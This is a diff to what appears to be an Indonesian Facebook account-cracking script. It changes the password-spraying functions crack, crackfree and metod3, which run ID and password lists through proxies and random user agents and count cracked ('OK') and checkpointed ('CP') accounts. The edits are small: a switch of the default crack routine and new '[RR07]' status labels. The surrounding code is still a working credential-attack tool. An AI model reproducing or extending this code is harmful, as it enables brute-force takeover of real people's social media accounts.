@@ -962,7 +962,7 @@ def passwrd():
 			elif 'metod3' in method:
 				pool.submit(metod3,idf,pwv)
 			else:
-				pool.submit(crackmbasic,idf,pwv)
+				pool.submit(crack,idf,pwv)
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
@@ -1620,7 +1620,7 @@ def bapi(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{x}[M1] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
+	sys.stdout.write(f"\r{x}[{asu}RR07] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1673,7 +1673,7 @@ def crack(idf,pwv):
 def crackfree(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{x}[M2] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
+	sys.stdout.write(f"\r{x}[{asu}RR07] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1770,7 +1770,7 @@ def metod3(idf,pwv):
 	global loop,ok,cp
 	ua = random.choice(ugen)
 	ses = requests.Session()
-	sys.stdout.write(f"\r{x}[M3] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
+	sys.stdout.write(f"\r{x}[{asu}RR07] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
